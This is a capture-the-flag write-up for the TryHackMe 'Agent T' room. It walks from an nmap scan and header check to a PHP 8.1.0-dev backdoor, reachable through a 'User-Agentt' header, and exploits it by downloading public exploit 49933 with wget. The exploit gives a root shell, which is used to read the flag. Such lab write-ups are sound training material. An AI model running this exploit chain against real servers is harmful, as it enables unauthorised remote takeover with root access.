# Agent T - TryHackMe Writeup

**Difficulty:** Easy  
**TL;DR:** Unauthenticated RCE via User-Agent in PHP 8.1.0-dev (EDB-ID:49933) → the flag
---------------------------
## Target
- Machine: `Agent-T`  
- Date: `2025-6-1`  
- Time: 10 min
- Environment: TryHackMe / CTF
---------------------------

## Steps
1. Initial scan:

```bash
└─$ nmap -sV -sC -Pn -T4  agentt.thm                                     

80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title:  Admin Dashboard
```

2. Scan the Headers:

```bash
└─$ curl -I http://agentt.thm/
HTTP/1.1 200 OK
Host: 10.10.233.40
Date: Mon, 20 Oct 2025 08:43:32 GMT
Connection: close
X-Powered-By: PHP/8.1.0-dev
Content-type: text/html; charset=UTF-8
```

3. Find Expolit:
```bash
└─$ searchsploit PHP 8.1.0-dev          

PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution        | php/webapps/49933.py

```


### EDB-ID:49933 :
```text 
the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed.
If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
```

4. Donwload the script and change the permission:
```bash
└─$ wget https://www.exploit-db.com/download/49933       

└─$ chmod +x 49933  
```

Run the script and get shell:
```bash
└─$ python3 49933            
Enter the full host url:
http://agentt.thm/

Interactive shell is opened on http://agentt.thm/ 
Can't acces tty; job crontol turned off.
$ id
uid=0(root) gid=0(root) groups=0(root)
```

### The flag :
```bash
$ cat /flag.txt
flag{[REDACTED]}
```
